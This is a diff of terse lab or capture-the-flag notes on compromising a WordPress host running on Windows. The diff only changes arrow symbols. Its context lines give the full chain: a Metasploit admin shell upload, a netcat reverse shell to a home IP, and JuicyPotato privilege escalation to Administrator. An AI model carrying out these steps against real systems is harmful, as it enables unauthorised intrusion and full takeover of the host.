@@ -9,7 +9,7 @@
 
 - website
 	- gobuster
-		- -> /wordpress, 		
+		- → /wordpress, 		
 	- on the site, some searches and inputs BUT
 	- since it's wordpress - run possible vulns through metasploit
 
@@ -22,7 +22,7 @@
 	- version 5.2.1
 	- `use unix/webapp/wp_admin_shell_upload)`
 		- fill out options
-	- => meterpreter
+	- → meterpreter
 		- change local dir `lcd /home/username/Downloads`
 		- `cd C:/inetpub/wwwroot/wordpress/wp-content/uploads`
 		- `upload nc.exe`
@@ -37,4 +37,4 @@
 		 - `echo STARTC:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe <HOME_IP> <PORT> > shell.bat`
 	 - set up listener
 	 - `JuicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337`
-	 - => you get Administrator
+	 - → you get Administrator
